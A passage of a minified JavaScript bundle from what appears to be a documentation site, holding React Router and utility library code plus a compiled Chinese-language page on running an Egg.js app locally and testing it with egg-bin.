19:r=e.sent;case 20:return e.abrupt("return",S(S({},n),r));case 21:case"end":return e.stop()}}),e)})));return function(t,n){return e.apply(this,arguments)}}(),re(r)?r:Promise.resolve(r)):i.reduce((function(e,n){return ee("function"===typeof n||"object"===C(n),"applyPlugins failed, all hooks for key ".concat(t," must be function or plain object.")),"function"===typeof n?n(e,l):S(S({},e),n)}),r);case te.event:return i.forEach((function(e){ee("function"===typeof e,"applyPlugins failed, all hooks for key ".concat(t," must be function.")),e(l)}));case te.compose:return function(){return ae({fns:i.concat(r),args:l})()}}}}]),e}()},"31yA":function(e,t){var n={}.hasOwnProperty;e.exports=function(e,t){return n.call(e,t)}},"37Ld":function(e,t,n){var a=n("QiLd");a("flatMap")},"3FeB":function(e,t,n){"use strict";function a(e,t){return a=Object.setPrototypeOf?Object.setPrototypeOf.bind():function(e,t){return e.__proto__=t,e},a(e,t)}n.d(t,"a",(function(){return a}))},"3MAR":function(e,t,n){},"3Qq0":function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("qPib");function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){Object(a["a"])(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}},"3dEy":function(e,t,n){"use strict";var a=n("FU0I"),r=n.n(a),l=n("5xdi"),o=n.n(l);n("v+xt");function i(e,t){return m(e)||d(e,t)||s(e,t)||c()}function c(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function s(e,t){if(e){if("string"===typeof e)return u(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?u(e,t):void 0}}function u(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function d(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function m(e){if(Array.isArray(e))return e}var p=function(e){var t=e.children,n=Object(a["useRef"])(),l=Object(a["useState"])(!1),c=i(l,2),s=c[0],u=c[1],d=Object(a["useState"])(!1),m=i(d,2),p=m[0],h=m[1];return Object(a["useEffect"])((function(){var e=n.current,t=o()((function(){u(e.scrollLeft>0),h(e.scrollLeft<e.scrollWidth-e.offsetWidth)}),100);return t(),e.addEventListener("scroll",t),window.addEventListener("resize",t),function(){e.removeEventListener("scroll",t),window.removeEventListener("resize",t)}}),[]),r.a.createElement("div",{className:"__dumi-default-table"},r.a.createElement("div",{className:"__dumi-default-table-content",ref:n,"data-left-folded":s||void 0,"data-right-folded":p||void 0},r.a.createElement("table",null,t)))};t["a"]=p},"3ptp":function(e,t,n){"use strict";n.d(t,"a",(function(){return y})),n.d(t,"b",(function(){return w})),n.d(t,"c",(function(){return L})),n.d(t,"d",(function(){return R})),n.d(t,"e",(function(){return v})),n.d(t,"f",(function(){return z})),n.d(t,"g",(function(){return H})),n.d(t,"h",(function(){return b})),n.d(t,"i",(function(){return P})),n.d(t,"j",(function(){return V})),n.d(t,"k",(function(){return $})),n.d(t,"l",(function(){return G})),n.d(t,"m",(function(){return X})),n.d(t,"n",(function(){return B}));var a=n("T68Q"),r=n("FU0I"),l=n.n(r),o=n("AFTV"),i=n("k1LG"),c=n("XL89"),s=n("2EJr"),u=n("/jHK"),d=n.n(u),m=(n("YeTV"),n("dDJo")),p=n("ZZVW"),h=n.n(p),g=function(e){var t=Object(i["a"])();return t.displayName=e,t},f=g("Router-History"),E=function(e){var t=Object(i["a"])();return t.displayName=e,t},b=E("Router"),v=function(e){function t(t){var n;return n=e.call(this,t)||this,n.state={location:t.history.location},n._isMounted=!1,n._pendingLocation=null,t.staticContext||(n.unlisten=t.history.listen((function(e){n._isMounted?n.setState({location:e}):n._pendingLocation=e}))),n}Object(a["a"])(t,e),t.computeRootMatch=function(e){return{path:"/",url:"/",params:{},isExact:"/"===e}};var n=t.prototype;return n.componentDidMount=function(){this._isMounted=!0,this._pendingLocation&&this.setState({location:this._pendingLocation})},n.componentWillUnmount=function(){this.unlisten&&this.unlisten()},n.render=function(){return l.a.createElement(b.Provider,{value:{history:this.props.history,location:this.state.location,match:t.computeRootMatch(this.state.location.pathname),staticContext:this.props.staticContext}},l.a.createElement(f.Provider,{children:this.props.children||null,value:this.props.history}))},t}(l.a.Component);var y=function(e){function t(){for(var t,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];return t=e.call.apply(e,[this].concat(a))||this,t.history=Object(o["d"])(t.props),t}Object(a["a"])(t,e);var n=t.prototype;return n.render=function(){return l.a.createElement(v,{history:this.history,children:this.props.children})},t}(l.a.Component);var k=function(e){function t(){return e.apply(this,arguments)||this}Object(a["a"])(t,e);var n=t.prototype;return n.componentDidMount=function(){this.props.onMount&&this.props.onMount.call(this,this)},n.componentDidUpdate=function(e){this.props.onUpdate&&this.props.onUpdate.call(this,this,e)},n.componentWillUnmount=function(){this.props.onUnmount&&this.props.onUnmount.call(this,this)},n.render=function(){return null},t}(l.a.Component);function w(e){var t=e.message,n=e.when,a=void 0===n||n;return l.a.createElement(b.Consumer,null,(function(e){if(e||Object(c["a"])(!1),!a||e.staticContext)return null;var n=e.history.block;return l.a.createElement(k,{onMount:function(e){e.release=n(t)},onUpdate:function(e,a){a.message!==t&&(e.release(),e.release=n(t))},onUnmount:function(e){e.release()},message:t})}))}var x={},j=1e4,S=0;function C(e){if(x[e])return x[e];var t=d.a.compile(e);return S<j&&(x[e]=t,S++),t}function A(e,t){return void 0===e&&(e="/"),void 0===t&&(t={}),"/"===e?e:C(e)(t,{pretty:!0})}function L(e){var t=e.computedMatch,n=e.to,a=e.push,r=void 0!==a&&a;return l.a.createElement(b.Consumer,null,(function(e){e||Object(c["a"])(!1);var a=e.history,i=e.staticContext,u=r?a.push:a.replace,d=Object(o["c"])(t?"string"===typeof n?A(n,t.params):Object(s["a"])({},n,{pathname:A(n.pathname,t.params)}):n);return i?(u(d),null):l.a.createElement(k,{onMount:function(){u(d)},onUpdate:function(e,t){var n=Object(o["c"])(t.to);Object(o["f"])(n,Object(s["a"])({},d,{key:n.key}))||u(d)},to:n})}))}var T={},N=1e4,O=0;function I(e,t){var n=""+t.end+t.strict+t.sensitive,a=T[n]||(T[n]={});if(a[e])return a[e];var r=[],l=d()(e,r,t),o={regexp:l,keys:r};return O<N&&(a[e]=o,O++),o}function P(e,t){void 0===t&&(t={}),("string"===typeof t||Array.isArray(t))&&(t={path:t});var n=t,a=n.path,r=n.exact,l=void 0!==r&&r,o=n.strict,i=void 0!==o&&o,c=n.sensitive,s=void 0!==c&&c,u=[].concat(a);return u.reduce((function(t,n){if(!n&&""!==n)return null;if(t)return t;var a=I(n,{end:l,strict:i,sensitive:s}),r=a.regexp,o=a.keys,c=r.exec(e);if(!c)return null;var u=c[0],d=c.slice(1),m=e===u;return l&&!m?null:{path:n,url:"/"===n&&""===u?"/":u,isExact:m,params:o.reduce((function(e,t,n){return e[t.name]=d[n],e}),{})}}),null)}var R=function(e){function t(){return e.apply(this,arguments)||this}Object(a["a"])(t,e);var n=t.prototype;return n.render=function(){var e=this;return l.a.createElement(b.Consumer,null,(function(t){t||Object(c["a"])(!1);var n=e.props.location||t.location,a=e.props.computedMatch?e.props.computedMatch:e.props.path?P(n.pathname,e.props):t.match,r=Object(s["a"])({},t,{location:n,match:a}),o=e.props,i=o.children,u=o.component,d=o.render;return Array.isArray(i)&&0===i.length&&(i=null),l.a.createElement(b.Provider,{value:r},r.match?i?"function"===typeof i?i(r):i:u?l.a.createElement(u,r):d?d(r):null:"function"===typeof i?i(r):null)}))},t}(l.a.Component);function _(e){return"/"===e.charAt(0)?e:"/"+e}function q(e,t){return e?Object(s["a"])({},t,{pathname:_(e)+t.pathname}):t}function M(e,t){if(!e)return t;var n=_(e);return 0!==t.pathname.indexOf(n)?t:Object(s["a"])({},t,{pathname:t.pathname.substr(n.length)})}function F(e){return"string"===typeof e?e:Object(o["e"])(e)}function D(e){return function(){Object(c["a"])(!1)}}function U(){}var z=function(e){function t(){for(var t,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];return t=e.call.apply(e,[this].concat(a))||this,t.handlePush=function(e){return t.navigateTo(e,"PUSH")},t.handleReplace=function(e){return t.navigateTo(e,"REPLACE")},t.handleListen=function(){return U},t.handleBlock=function(){return U},t}Object(a["a"])(t,e);var n=t.prototype;return n.navigateTo=function(e,t){var n=this.props,a=n.basename,r=void 0===a?"":a,l=n.context,i=void 0===l?{}:l;i.action=t,i.location=q(r,Object(o["c"])(e)),i.url=F(i.location)},n.render=function(){var e=this.props,t=e.basename,n=void 0===t?"":t,a=e.context,r=void 0===a?{}:a,i=e.location,c=void 0===i?"/":i,u=Object(m["a"])(e,["basename","context","location"]),d={createHref:function(e){return _(n+F(e))},action:"POP",location:M(n,Object(o["c"])(c)),push:this.handlePush,replace:this.handleReplace,go:D("go"),goBack:D("goBack"),goForward:D("goForward"),listen:this.handleListen,block:this.handleBlock};return l.a.createElement(v,Object(s["a"])({},u,{history:d,staticContext:r}))},t}(l.a.Component);var H=function(e){function t(){return e.apply(this,arguments)||this}Object(a["a"])(t,e);var n=t.prototype;return n.render=function(){var e=this;return l.a.createElement(b.Consumer,null,(function(t){t||Object(c["a"])(!1);var n,a,r=e.props.location||t.location;return l.a.Children.forEach(e.props.children,(function(e){if(null==a&&l.a.isValidElement(e)){n=e;var o=e.props.path||e.props.from;a=o?P(r.pathname,Object(s["a"])({},e.props,{path:o})):t.match}})),a?l.a.cloneElement(n,{location:r,computedMatch:a}):null}))},t}(l.a.Component);function B(e){var t="withRouter("+(e.displayName||e.name)+")",n=function(t){var n=t.wrappedComponentRef,a=Object(m["a"])(t,["wrappedComponentRef"]);return l.a.createElement(b.Consumer,null,(function(t){return t||Object(c["a"])(!1),l.a.createElement(e,Object(s["a"])({},a,t,{ref:n}))}))};return n.displayName=t,n.WrappedComponent=e,h()(n,e)}var W=l.a.useContext;function V(){return W(f)}function $(){return W(b).location}function G(){var e=W(b).match;return e?e.params:{}}function X(e){var t=$(),n=W(b).match;return e?P(t.pathname,e):n}},"3uL2":function(e,t,n){e.exports=n("/iuR")()},"41sL":function(e,t,n){var a=n("0mt+");a({target:"Math",stat:!0},{umulh:function(e,t){var n=65535,a=+e,r=+t,l=a&n,o=r&n,i=a>>>16,c=r>>>16,s=(i*o>>>0)+(l*o>>>16);return i*c+(s>>>16)+((l*c>>>0)+(s&n)>>>16)}})},"43P3":function(e,t,n){},"43d4":function(e,t,n){"use strict";function a(){var e=l(n("FU0I"));return a=function(){return e},e}function r(){var e=n("j00X");return r=function(){return e},e}function l(e){return e&&e.__esModule?e:{default:e}}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){c(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t,n){return t=s(t),t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e){var t=u(e,"string");return"symbol"===typeof t?t:String(t)}function u(e,t){if("object"!==typeof e||null===e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var a=n.call(e,t||"default");if("object"!==typeof a)return a;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var d=function(e){return e.render()},m=function(e,t){var n=[],l=e.match.params.uuid,o=void 0===e.location.query.wrapper,c=t[l];if(c){var s=i(i({},c.previewerProps),{},{hideActions:(c.previewerProps.hideActions||[]).concat(["EXTERNAL"])});void 0!==e.location.query.capture&&(s.motions=(s.motions||[]).slice(),s.motions.unshift("autoplay"),s.motions.every((function(e){return!e.startsWith("capture")}))&&s.motions.push("capture:[id|=root]")),n=o?[a()["default"].createElement(d,{render:function(){return(0,r().useMotions)(s.motions||[],"undefined"!==typeof window?document.documentElement:null),a()["default"].createElement("div",{},a()["default"].createElement(c.component))}})]:[s,a()["default"].createElement(c.component)]}return n};t["default"]=m},"45Gl":function(e,t,n){var a=n("qXUs");function r(e){if(Array.isArray(e))return a(e)}e.exports=r,e.exports.__esModule=!0,e.exports["default"]=e.exports},"4BFV":function(e,t,n){var a=n("Xdqv"),r=n("4avo"),l="\u200b\x85\u180e";e.exports=function(e){return a((function(){return!!r[e]()||l[e]()!=l||r[e].name!==e}))}},"4Sss":function(e,t,n){"use strict";var a={MAC_ENTER:3,BACKSPACE:8,TAB:9,NUM_CENTER:12,ENTER:13,SHIFT:16,CTRL:17,ALT:18,PAUSE:19,CAPS_LOCK:20,ESC:27,SPACE:32,PAGE_UP:33,PAGE_DOWN:34,END:35,HOME:36,LEFT:37,UP:38,RIGHT:39,DOWN:40,PRINT_SCREEN:44,INSERT:45,DELETE:46,ZERO:48,ONE:49,TWO:50,THREE:51,FOUR:52,FIVE:53,SIX:54,SEVEN:55,EIGHT:56,NINE:57,QUESTION_MARK:63,A:65,B:66,C:67,D:68,E:69,F:70,G:71,H:72,I:73,J:74,K:75,L:76,M:77,N:78,O:79,P:80,Q:81,R:82,S:83,T:84,U:85,V:86,W:87,X:88,Y:89,Z:90,META:91,WIN_KEY_RIGHT:92,CONTEXT_MENU:93,NUM_ZERO:96,NUM_ONE:97,NUM_TWO:98,NUM_THREE:99,NUM_FOUR:100,NUM_FIVE:101,NUM_SIX:102,NUM_SEVEN:103,NUM_EIGHT:104,NUM_NINE:105,NUM_MULTIPLY:106,NUM_PLUS:107,NUM_MINUS:109,NUM_PERIOD:110,NUM_DIVISION:111,F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,NUMLOCK:144,SEMICOLON:186,DASH:189,EQUALS:187,COMMA:188,PERIOD:190,SLASH:191,APOSTROPHE:192,SINGLE_QUOTE:222,OPEN_SQUARE_BRACKET:219,BACKSLASH:220,CLOSE_SQUARE_BRACKET:221,WIN_KEY:224,MAC_FF_META:224,WIN_IME:229,isTextModifyingKeyEvent:function(e){var t=e.keyCode;if(e.altKey&&!e.ctrlKey||e.metaKey||t>=a.F1&&t<=a.F12)return!1;switch(t){case a.ALT:case a.CAPS_LOCK:case a.CONTEXT_MENU:case a.CTRL:case a.DOWN:case a.END:case a.ESC:case a.HOME:case a.INSERT:case a.LEFT:case a.MAC_FF_META:case a.META:case a.NUMLOCK:case a.NUM_CENTER:case a.PAGE_DOWN:case a.PAGE_UP:case a.PAUSE:case a.PRINT_SCREEN:case a.RIGHT:case a.SHIFT:case a.UP:case a.WIN_KEY:case a.WIN_KEY_RIGHT:return!1;default:return!0}},isCharacterKey:function(e){if(e>=a.ZERO&&e<=a.NINE)return!0;if(e>=a.NUM_ZERO&&e<=a.NUM_MULTIPLY)return!0;if(e>=a.A&&e<=a.Z)return!0;if(-1!==window.navigator.userAgent.indexOf("WebKit")&&0===e)return!0;switch(e){case a.SPACE:case a.QUESTION_MARK:case a.NUM_PLUS:case a.NUM_MINUS:case a.NUM_PERIOD:case a.NUM_DIVISION:case a.SEMICOLON:case a.DASH:case a.EQUALS:case a.COMMA:case a.PERIOD:case a.SLASH:case a.APOSTROPHE:case a.SINGLE_QUOTE:case a.OPEN_SQUARE_BRACKET:case a.BACKSLASH:case a.CLOSE_SQUARE_BRACKET:return!0;default:return!1}}};t["a"]=a},"4avo":function(e,t){e.exports="\t\n\v\f\r \xa0\u1680\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\u2028\u2029\ufeff"},"4bQT":function(e,t,n){var a=n("oyD1"),r=n("eIxH");e.exports=Object.setPrototypeOf||("__proto__"in{}?function(){var e,t=!1,n={};try{e=Object.getOwnPropertyDescriptor(Object.prototype,"__proto__").set,e.call(n,[]),t=n instanceof Array}catch(l){}return function(n,l){return a(n),r(l),t?e.call(n,l):n.__proto__=l,n}}():void 0)},"4dIG":function(e,t,n){"use strict";n.d(t,"a",(function(){return g}));var a=n("d9lq"),r=n("LZgk"),l="data-rc-order",o="rc-util-key",i=new Map;function c(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=e.mark;return t?t.startsWith("data-")?t:"data-".concat(t):o}function s(e){if(e.attachTo)return e.attachTo;var t=document.querySelector("head");return t||document.body}function u(e){return"queue"===e?"prependQueue":e?"prepend":"append"}function d(e){return Array.from((i.get(e)||e).children).filter((function(e){return"STYLE"===e.tagName}))}function m(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};if(!Object(a["a"])())return null;var n=t.csp,r=t.prepend,o=document.createElement("style");o.setAttribute(l,u(r)),null!==n&&void 0!==n&&n.nonce&&(o.nonce=null===n||void 0===n?void 0:n.nonce),o.innerHTML=e;var i=s(t),c=i.firstChild;if(r){if("queue"===r){var m=d(i).filter((function(e){return["prepend","prependQueue"].includes(e.getAttribute(l))}));if(m.length)return i.insertBefore(o,m[m.length-1].nextSibling),o}i.insertBefore(o,c)}else i.appendChild(o);return o}function p(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=s(t);return d(n).find((function(n){return n.getAttribute(c(t))===e}))}function h(e,t){var n=i.get(e);if(!n||!Object(r["a"])(document,n)){var a=m("",t),l=a.parentNode;i.set(e,l),e.removeChild(a)}}function g(e,t){var n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},a=s(n);h(a,n);var r=p(t,n);if(r){var l,o,i;if(null!==(l=n.csp)&&void 0!==l&&l.nonce&&r.nonce!==(null===(o=n.csp)||void 0===o?void 0:o.nonce))r.nonce=null===(i=n.csp)||void 0===i?void 0:i.nonce;return r.innerHTML!==e&&(r.innerHTML=e),r}var u=m(e,n);return u.setAttribute(c(n),t),u}},"4qM7":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u4e3a\u4e86\u63d0\u5347\u7814\u53d1\u4f53\u9a8c\uff0c\u6211\u4eec\u63d0\u4f9b\u4e86\u4fbf\u6377\u7684\u65b9\u5f0f\u5728\u672c\u5730\u8fdb\u884c\u5f00\u53d1\u3001\u8c03\u8bd5\u3001\u5355\u5143\u6d4b\u8bd5\u7b49\u3002"),r.a.createElement("p",null,"\u5728\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5230 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-bin"},"egg-bin")," \u6a21\u5757\uff08\u53ea\u5728\u672c\u5730\u5f00\u53d1\u548c\u5355\u5143\u6d4b\u8bd5\u4f7f\u7528\uff0c\u5982\u679c\u7ebf\u4e0a\u8bf7\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"./deployment"},"\u5e94\u7528\u90e8\u7f72"),"\uff09\u3002"),r.a.createElement("p",null,"\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u628a ",r.a.createElement("code",null,"egg-bin")," \u6a21\u5757\u4f5c\u4e3a ",r.a.createElement("code",null,"devDependencies")," \u5f15\u5165\uff1a"),r.a.createElement(o["a"],{code:"$ npm i egg-bin --save-dev",lang:"bash"}),r.a.createElement("h2",{id:"\u542f\u52a8\u5e94\u7528"},r.a.createElement(l["AnchorLink"],{to:"#\u542f\u52a8\u5e94\u7528","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u542f\u52a8\u5e94\u7528"),r.a.createElement("p",null,"\u672c\u5730\u542f\u52a8\u5e94\u7528\u8fdb\u884c\u5f00\u53d1\u6d3b\u52a8\uff0c\u5f53\u6211\u4eec\u4fee\u6539\u4ee3\u7801\u5e76\u4fdd\u5b58\u540e\uff0c\u5e94\u7528\u4f1a\u81ea\u52a8\u91cd\u542f\u5b9e\u65f6\u751f\u6548\u3002"),r.a.createElement("h3",{id:"\u6dfb\u52a0\u547d\u4ee4"},r.a.createElement(l["AnchorLink"],{to:"#\u6dfb\u52a0\u547d\u4ee4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6dfb\u52a0\u547d\u4ee4"),r.a.createElement("p",null,"\u6dfb\u52a0 ",r.a.createElement("code",null,"npm scripts")," \u5230 ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "dev": "egg-bin dev"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm run dev")," \u547d\u4ee4\u542f\u52a8\u5e94\u7528\u3002"),r.a.createElement("h3",{id:"\u73af\u5883\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u73af\u5883\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u73af\u5883\u914d\u7f6e"),r.a.createElement("p",null,"\u672c\u5730\u542f\u52a8\u7684\u5e94\u7528\u662f\u4ee5 ",r.a.createElement("code",null,"env: local")," \u542f\u52a8\u7684\uff0c\u8bfb\u53d6\u7684\u914d\u7f6e\u4e5f\u662f ",r.a.createElement("code",null,"config.default.js")," \u548c ",r.a.createElement("code",null,"config.local.js")," \u5408\u5e76\u7684\u7ed3\u679c\u3002"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6ce8\u610f\uff1a\u672c\u5730\u5f00\u53d1\u73af\u5883\u4f9d\u8d56 ",r.a.createElement("code",null,"egg-development")," \u63d2\u4ef6\uff0c\u9ed8\u8ba4\u5f00\u542f\uff0c\u5176\u4ed6\u73af\u5883\u4e0b\u5173\u95ed\uff0c\u914d\u7f6e\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development/blob/master/config/config.default.js"},"config/config.default.js")," \u3002")),r.a.createElement("h3",{id:"\u5173\u4e8e-reload-\u529f\u80fd"},r.a.createElement(l["AnchorLink"],{to:"#\u5173\u4e8e-reload-\u529f\u80fd","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5173\u4e8e ",r.a.createElement("code",null,"Reload")," \u529f\u80fd"),r.a.createElement("p",null,"\u4ee5\u4e0b\u76ee\u5f55\uff08\u542b\u5b50\u76ee\u5f55\uff09\u4e0b\u9ed8\u8ba4\u4f1a\u76d1\u542c\u5f00\u53d1\u73af\u5883\u4e0b\u7684\u6587\u4ef6\u53d8\u5316\uff0c\u89e6\u53d1\u4e00\u6b21Egg\u5f00\u53d1\u73af\u5883\u670d\u52a1\u5668\u91cd\u8f7d\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"$","{","app_root","}","/app"),r.a.createElement("li",null,"$","{","app_root","}","/config"),r.a.createElement("li",null,"$","{","app_root","}","/mocks"),r.a.createElement("li",null,"$","{","app_root","}","/mocks_proxy"),r.a.createElement("li",null,"$","{","app_root","}","/app.js")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u8bbe\u7f6e ",r.a.createElement("code",null,"config.development.overrideDefault")," \u4e3a ",r.a.createElement("code",null,"true")," \u5c06\u8df3\u8fc7\u9ed8\u8ba4\u5408\u5e76.")),r.a.createElement("p",null,"\u4ee5\u4e0b\u76ee\u5f55\u4e0b\uff08\u5305\u62ec\u5b50\u76ee\u5f55\uff09\u9ed8\u8ba4\u5ffd\u7565\u5f00\u53d1\u73af\u5883\u4e0b\u7684\u6587\u4ef6\u6539\u52a8\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"$","{","app_root","}","/app/view"),r.a.createElement("li",null,"$","{","app_root","}","/app/assets"),r.a.createElement("li",null,"$","{","app_root","}","/app/public"),r.a.createElement("li",null,"$","{","app_root","}","/app/web")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u8bbe\u7f6e ",r.a.createElement("code",null,"config.development.overrideIgnore")," \u4e3a ",r.a.createElement("code",null,"true")," \u5c06\u8df3\u8fc7\u9ed8\u8ba4\u5408\u5e76.")),r.a.createElement("h3",{id:"\u6307\u5b9a\u7aef\u53e3"},r.a.createElement(l["AnchorLink"],{to:"#\u6307\u5b9a\u7aef\u53e3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6307\u5b9a\u7aef\u53e3"),r.a.createElement("p",null,"\u672c\u5730\u542f\u52a8\u5e94\u7528\u9ed8\u8ba4\u76d1\u542c 7001 \u7aef\u53e3\uff0c\u53ef\u6307\u5b9a\u5176\u4ed6\u7aef\u53e3\uff0c\u4f8b\u5982\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "dev": "egg-bin dev --port 7001"\n  }\n}',lang:"json"}),r.a.createElement("h2",{id:"\u5355\u5143\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u5355\u5143\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5355\u5143\u6d4b\u8bd5"),r.a.createElement("p",null,"\u8fd9\u91cc\u4e3b\u8981\u8bb2\u89e3\u5de5\u5177\u90e8\u5206\u7684\u4f7f\u7528\uff0c\u66f4\u591a\u5173\u4e8e\u5355\u5143\u6d4b\u8bd5\u7684\u5185\u5bb9\u8bf7\u53c2\u8003",r.a.createElement(l["Link"],{to:"./unittest"},"\u8fd9\u91cc"),"\u3002"),r.a.createElement("h3",{id:"\u6dfb\u52a0\u547d\u4ee4-1"},r.a.createElement(l["AnchorLink"],{to:"#\u6dfb\u52a0\u547d\u4ee4-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6dfb\u52a0\u547d\u4ee4"),r.a.createElement("p",null,"\u6dfb\u52a0 ",r.a.createElement("code",null,"npm scripts")," \u5230 ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "test": "egg-bin test"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm test")," \u547d\u4ee4\u8fd0\u884c\u5355\u5143\u6d4b\u8bd5\u3002"),r.a.createElement("h3",{id:"\u73af\u5883\u914d\u7f6e-1"},r.a.createElement(l["AnchorLink"],{to:"#\u73af\u5883\u914d\u7f6e-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u73af\u5883\u914d\u7f6e"),r.a.createElement("p",null,"\u6d4b\u8bd5\u7528\u4f8b\u6267\u884c\u65f6\uff0c\u5e94\u7528\u662f\u4ee5 ",r.a.createElement("code",null,"env: unittest")," \u542f\u52a8\u7684\uff0c\u8bfb\u53d6\u7684\u914d\u7f6e\u4e5f\u662f ",r.a.createElement("code",null,"config.default.js")," \u548c ",r.a.createElement("code",null,"config.unittest.js")," \u5408\u5e76\u7684\u7ed3\u679c\u3002"),r.a.createElement("h3",{id:"\u8fd0\u884c\u7279\u5b9a\u7528\u4f8b\u6587\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u8fd0\u884c\u7279\u5b9a\u7528\u4f8b\u6587\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8fd0\u884c\u7279\u5b9a\u7528\u4f8b\u6587\u4ef6"),r.a.createElement("p",null,"\u8fd0\u884c ",r.a.createElement("code",null,"npm test")," \u65f6\u4f1a\u81ea\u52a8\u6267\u884c test \u76ee\u5f55\u4e0b\u7684\u4ee5 ",r.a.createElement("code",null,".test.js")," \u7ed3\u5c3e\u7684\u6587\u4ef6\uff08\u9ed8\u8ba4 ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/glob"},"glob")," \u5339\u914d\u89c4\u5219 ",r.a.createElement("code",null,"test/**/*.test.js")," \uff09\u3002"),r.a.createElement("p",null,"\u6211\u4eec\u5728\u7f16\u5199\u7528\u4f8b\u65f6\u5f80\u5f80\u60f3\u5355\u72ec\u6267\u884c\u6b63\u5728\u7f16\u5199\u7684\u7528\u4f8b\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6307\u5b9a\u7279\u5b9a\u7528\u4f8b\u6587\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"$ TESTS=test/x.test.js npm test",lang:"bash"}),r.a.createElement("p",null,"\u652f\u6301 